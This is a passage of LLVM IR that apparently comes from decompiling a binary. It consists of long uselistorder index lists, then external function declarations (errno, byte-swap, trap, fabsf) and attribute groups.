374, 831, 832, 662, 833, 214, 834, 52, 53, 112, 835, 836, 663, 837, 838, 54, 55, 111, 839, 216, 840, 160, 810, 664, 811, 812, 496, 813, 814, 665, 815, 816, 819, 817, 818, 375, 820, 56, 57, 115, 821, 666, 58, 59, 114, 822, 844, 667, 845, 846, 847, 848, 849, 850, 668, 851, 852, 853, 854, 734, 733, 378, 736, 737, 735, 376, 377, 738, 739, 497, 740, 742, 743, 669, 744, 745, 746, 670, 747, 748, 60, 61, 116, 749, 750, 751, 101, 102, 752, 753, 754, 218, 755, 756, 757, 758, 759, 498, 760, 761, 762, 763, 764, 765, 161, 768, 671, 769, 770, 62, 63, 118, 771, 772, 773, 672, 774, 775, 776, 777, 673, 778, 779, 64, 65, 117, 780, 781, 782, 783, 784, 219, 221, 766, 220, 767, 222, 785, 162, 855, 860, 861, 856, 857, 858, 863, 864, 865, 223, 866, 867, 868, 869, 870, 859, 862, 871, 163, 876, 877, 878, 499, 983, 500, 879, 1413, 1414, 1415, 224, 1416, 1309, 1308, 1252, 1225, 1091, 881, 880, 882, 984, 985, 986, 1539, 1540, 1541, 1542, 225, 1543, 1544, 1545, 1253, 1254, 397, 398, 501, 1550, 677, 1551, 502, 1552, 1553, 503, 1554, 1555, 675, 226, 380, 1556, 676, 1557, 504, 103, 1558, 1559, 505, 1574, 1575, 1578, 674, 379, 1579, 435, 165, 164, 1576, 1577, 1546, 1547, 678, 227, 361, 722, 13, 14, 1570, 1115, 886, 1569, 1192, 1310, 136, 1311, 679, 228, 1312, 1313, 1560, 1561, 1562, 1563, 506, 1564, 166, 958, 959, 66, 67, 119, 1314, 1315, 108, 382, 1319, 1316, 1317, 680, 1318, 1320, 681, 1321, 1322, 1323, 1324, 68, 69, 120, 1325, 229, 1326, 1327, 1328, 1330, 1329, 381, 723, 725, 724, 230, 726, 727, 728, 507, 729, 167, 1548, 1549, 960, 961, 962, 963, 964, 965, 232, 168, 966, 967, 968, 137, 231, 969, 169, 509, 510, 1565, 508, 170, 171, 1260, 1261, 1262, 1263, 1264, 233, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 234, 1255, 511, 1256, 1257, 512, 1258, 1259, 172, 682, 235, 236, 1226, 513, 237, 1227, 1228, 1229, 1230, 1231, 173, 244, 238, 240, 243, 242, 241, 246, 247, 239, 245, 1272, 1273, 1297, 1298, 174, 1274, 1275, 251, 249, 250, 1276, 1277, 257, 256, 183, 248, 1278, 1279, 1280, 1281, 1282, 1283, 404, 403, 436, 514, 1284, 1285, 1286, 104, 1287, 253, 252, 254, 255, 182, 1288, 1289, 383, 1290, 1291, 144, 1292, 1293, 1294, 1295, 1296, 15, 16, 887, 888, 105, 17, 437, 515, 1215, 258, 1193, 1195, 1194, 1217, 1216, 1093, 1092, 890, 889, 891, 892, 1219, 1218, 1220, 1249, 1580, 1581, 121, 175, 987, 988, 989, 259, 883, 884, 260, 990, 995, 996, 997, 998, 261, 991, 262, 992, 993, 999, 970, 516, 1094, 1566, 1567, 1568, 893, 895, 894, 1000, 896, 1331, 897, 898, 899, 1571, 1572, 1573, 994, 18, 1417, 1418, 1419, 142, 1420, 1421, 1422, 1423, 1424, 263, 1425, 683, 686, 684, 685, 1426, 687, 184, 264, 1001, 1002, 138, 393, 1003, 1004, 688, 19, 384, 265, 266, 267, 70, 268, 517, 900, 1005, 1006, 1007, 1234, 1233, 1235, 1236, 1237, 1238, 46, 269, 1239, 1240, 1241, 270, 129, 130, 472, 473, 885, 272, 271, 273, 1008, 274, 1009, 1010, 275, 1299, 1300, 518, 276, 1011, 277, 278, 1146, 279, 1116, 280, 281, 908, 901, 282, 902, 903, 904, 715, 716, 718, 703, 704, 693, 705, 717, 706, 694, 707, 695, 708, 696, 709, 697, 710, 711, 131, 71, 364, 365, 712, 698, 713, 699, 714, 719, 720, 519, 721, 905, 689, 906, 520, 907, 386, 385, 909, 910, 911, 912, 284, 283, 913, 914, 915, 700, 362, 916, 122, 123, 363, 917, 124, 125, 521, 919, 920, 690, 921, 922, 923, 924, 925, 522, 926, 927, 928, 394, 185, 692, 929, 930, 931, 932, 933, 934, 691, 935, 936, 523, 937, 524, 938, 941, 942, 943, 285, 939, 286, 940, 287, 918, 1117, 1118, 944, 288, 945, 946, 947, 948, 949, 950, 951, 367, 366, 952, 525, 953, 526, 954, 527, 955, 405, 956, 528, 957, 293, 292, 701, 176, 702, 291, 290, 289, 388, 395, 529, 971, 294, 295, 979, 972, 973, 974, 975, 976, 977, 978, 387, 980, 981, 72, 982, 296, 530, 139, 1012, 1013, 1014, 1015, 391, 1016, 1017, 1018, 390, 1019, 1020, 1021, 1022, 297, 1023, 1025, 1024, 177, 178, 298, 389, 300, 299, 1026, 301, 302, 106, 303, 1027, 306, 1028, 1029, 1030, 1031, 305, 304, 307, 1032, 1033, 73, 74, 179, 1034, 1035, 20, 21, 22, 23, 1036, 1037, 308, 439, 1038, 531, 1039, 532, 1040, 533, 1041, 534, 1042, 535, 1043, 536, 1044, 438, 1045, 312, 1047, 1048, 1049, 1050, 310, 309, 313, 1051, 1052, 75, 76, 1046, 311, 1054, 1053, 24, 25, 26, 27, 1055, 314, 1056, 1057, 441, 1058, 537, 1059, 538, 1060, 539, 1061, 540, 1062, 541, 1063, 542, 1064, 440, 1065, 543, 1066, 318, 1068, 1069, 1070, 1071, 316, 315, 319, 1072, 1073, 77, 78, 1067, 317, 1074, 79, 544, 1075, 1077, 1078, 1079, 1080, 545, 1081, 28, 29, 30, 31, 32, 1076, 320, 1082, 1083, 447, 1084, 446, 1085, 445, 1086, 444, 1087, 442, 1088, 443, 1089, 546, 1090, 324, 1096, 1097, 1098, 1099, 322, 321, 325, 1100, 1101, 80, 81, 1095, 323, 1102, 82, 547, 1103, 1105, 1106, 1107, 1108, 548, 1109, 33, 34, 35, 36, 37, 1104, 326, 1110, 1111, 449, 1112, 448, 1113, 549, 1114, 329, 1119, 1120, 1121, 1122, 328, 327, 330, 1123, 1124, 83, 84, 186, 143, 331, 107, 551, 1125, 1126, 1127, 1128, 1129, 332, 1130, 1131, 452, 1132, 1133, 1134, 1135, 336, 333, 334, 335, 1136, 1137, 1138, 1139, 552, 1140, 1141, 451, 1142, 550, 1143, 450, 1144, 553, 1145, 338, 1147, 1148, 1149, 1150, 337, 339, 1151, 1152, 85, 86, 132, 1153, 340, 1154, 1155, 455, 1156, 453, 1157, 454, 1158, 1161, 1162, 1163, 342, 343, 1164, 1165, 87, 1159, 1160, 341, 1167, 1166, 1168, 344, 1169, 1170, 458, 1171, 457, 1172, 456, 1173, 554, 1174, 1176, 1177, 1178, 346, 347, 348, 1180, 1181, 88, 1179, 1175, 345, 1183, 1184, 1182, 1185, 349, 1186, 1187, 461, 1188, 460, 1189, 459, 1190, 555, 1191, 353, 1197, 1198, 1199, 1200, 352, 351, 354, 1201, 1202, 89, 90, 1196, 350, 1203, 1204, 355, 1205, 1206, 464, 1207, 463, 1208, 462, 1209, 556, 1210, 558, 133, 91, 1211, 180, 466, 465, 559, 560, 1212, 1213, 1214, 557, 562, 134, 92, 1221, 181, 468, 467, 563, 1222, 1223, 1224, 561, 406, 1232, 1242, 356, 1243, 1250, 357, 1251, 1301, 145, 1302, 1303, 407, 564, 392, 1304, 1305, 47, 396, 1306, 1307, 565, 1332, 358, 1333, 1582, 469, 730, 470, 471, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597 }
  uselistorder i32* @r4, { 85, 820, 821, 822, 823, 824, 842, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 10, 839, 840, 841, 843, 844, 845, 846, 847, 848, 849, 850, 92, 93, 94, 95, 138, 11, 139, 140, 141, 12, 142, 143, 144, 145, 146, 147, 148, 0, 13, 149, 150, 151, 152, 153, 154, 155, 156, 215, 216, 851, 86, 87, 88, 853, 854, 855, 5, 858, 57, 852, 737, 738, 96, 97, 98, 99, 100, 101, 102, 103, 104, 859, 860, 157, 158, 14, 4, 159, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 15, 160, 161, 162, 163, 164, 165, 166, 167, 186, 16, 187, 188, 168, 169, 171, 17, 172, 175, 18, 176, 177, 19, 178, 179, 20, 180, 181, 21, 182, 183, 22, 184, 54, 185, 170, 189, 23, 190, 191, 192, 193, 194, 195, 196, 173, 174, 89, 90, 91, 105, 106, 107, 108, 24, 109, 25, 26, 110, 111, 112, 113, 114, 115, 116, 121, 122, 27, 123, 124, 28, 125, 126, 29, 127, 128, 30, 129, 130, 31, 131, 132, 32, 133, 134, 117, 118, 119, 120, 135, 136, 137, 197, 198, 199, 33, 200, 201, 202, 34, 203, 204, 205, 206, 207, 208, 52, 209, 210, 211, 212, 213, 214, 217, 218, 219, 220, 342, 221, 856, 857, 802, 803, 804, 805, 806, 807, 701, 702, 343, 344, 877, 878, 879, 742, 743, 56, 882, 53, 883, 884, 885, 901, 903, 904, 905, 902, 886, 891, 899, 900, 880, 892, 893, 894, 895, 58, 808, 809, 6, 35, 810, 36, 811, 812, 813, 887, 888, 814, 77, 78, 79, 80, 81, 82, 881, 889, 890, 222, 223, 224, 225, 744, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 37, 762, 763, 764, 765, 745, 746, 747, 748, 749, 703, 704, 705, 706, 707, 708, 709, 710, 711, 38, 712, 713, 714, 715, 716, 717, 718, 719, 720, 766, 788, 789, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 55, 780, 781, 1, 782, 783, 784, 785, 786, 787, 229, 230, 231, 636, 637, 638, 639, 640, 643, 644, 645, 641, 642, 675, 676, 677, 678, 679, 680, 681, 489, 490, 491, 494, 495, 496, 492, 493, 232, 233, 234, 235, 236, 237, 238, 239, 240, 682, 683, 684, 685, 686, 687, 688, 59, 345, 346, 347, 348, 349, 350, 351, 226, 227, 228, 352, 353, 354, 355, 9, 356, 357, 358, 60, 359, 360, 361, 362, 241, 242, 243, 246, 247, 248, 244, 245, 249, 250, 251, 252, 253, 254, 896, 897, 898, 255, 256, 257, 363, 364, 365, 366, 367, 258, 579, 580, 538, 539, 259, 260, 261, 262, 263, 264, 265, 266, 72, 73, 74, 267, 268, 269, 270, 75, 63, 64, 61, 62, 65, 66, 67, 68, 69, 70, 71, 76, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 289, 290, 291, 292, 299, 300, 301, 302, 303, 7, 293, 294, 295, 296, 297, 298, 285, 286, 287, 288, 689, 690, 540, 541, 542, 543, 544, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 83, 323, 39, 40, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 368, 369, 8, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 41, 386, 42, 387, 43, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 44, 412, 45, 413, 46, 414, 47, 415, 416, 417, 418, 48, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 49, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 50, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 646, 647, 51, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 2, 668, 669, 670, 671, 672, 673, 674, 691, 692, 693, 3, 694, 695, 696, 697, 698, 699, 700, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 739, 740, 741, 790, 791, 794, 792, 793, 795, 796, 797, 798, 799, 800, 801, 815, 816, 817, 818, 84, 819 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
